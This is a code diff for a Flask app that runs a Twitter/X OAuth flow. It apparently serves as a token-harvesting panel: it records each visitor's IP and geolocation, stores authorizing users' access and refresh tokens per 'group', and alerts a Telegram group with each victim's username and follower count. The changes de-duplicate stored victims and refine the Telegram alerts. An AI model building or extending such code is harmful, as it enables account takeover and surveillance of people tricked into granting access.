@@ -53,7 +53,7 @@ def oauth():
     country, city = location_data.get("country"), location_data.get("city")
     country_flag = ''.join(chr(ord(c) + 127397) for c in location_data.get("countryCode", ""))
 
-    message = f'🔗 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
+    message = f'🌐 *Connection:* {real_ip}\n\n{country_flag} *{city}, {country}*'
     send_telegram_message(group['group_id'], message)
 
     twitter_oauth_url = generate_twitter_oauth_url()
@@ -72,11 +72,10 @@ def generate_twitter_oauth_url():
 def auth_callback():
     authorization_code = request.args.get('code')
     access_token, refresh_token = exchange_token_for_access(authorization_code)
-    print(access_token)
-    print(refresh_token)
     
     user_data = get_twitter_user_data(access_token)
-    username = user_data.get('username')
+    user_id = user_data['id']
+    username = user_data['username']
     followers_count = user_data['public_metrics']['followers_count']
     
     real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
@@ -89,16 +88,33 @@ def auth_callback():
     authorization_time = datetime.utcnow()
     
     group_id = session.get("group_id")
-    groups.update_one(
+    existing_user = groups.find_one({
+        "group_id": group_id,
+        "authenticated_users.user_id": user_id
+    })
+    
+    if existing_user:
+        groups.update_one(
+            {"group_id": group_id, "authenticated_users.user_id": user_id},
+            {"$set": {
+                "authenticated_users.$.username": username,
+                "authenticated_users.$.location": location,
+                "authenticated_users.$.access_token": access_token,
+                "authenticated_users.$.refresh_token": refresh_token
+            }}
+        )
+    else:
+        groups.update_one(
             {"group_id": group_id},
             {
                 "$push": {
                     "authenticated_users": {
+                        "user_id": user_id,
                         "username": username,
                         "location": location,
                         "access_token": access_token,
                         "refresh_token": refresh_token,
-                        "authorized_at": authorization_time  # Add authorization time
+                        "authorized_at": authorization_time
                     }
                 }
             }
@@ -147,7 +163,7 @@ def format_followers(followers_count):
 
 def send_to_telegram(username, followers_count, group_id):
     followers_count = format_followers(followers_count)
-    message = (f'🐍 *User* **[{username}](https://x.com/{username})** *has authorized.*\n'
+    message = (f'🐍 *User [{username}](https://x\\.com/{username}) has authorized\\.*\n'
                f'👥 *Followers:* {followers_count}')
     
     send_telegram_message(group_id, message)
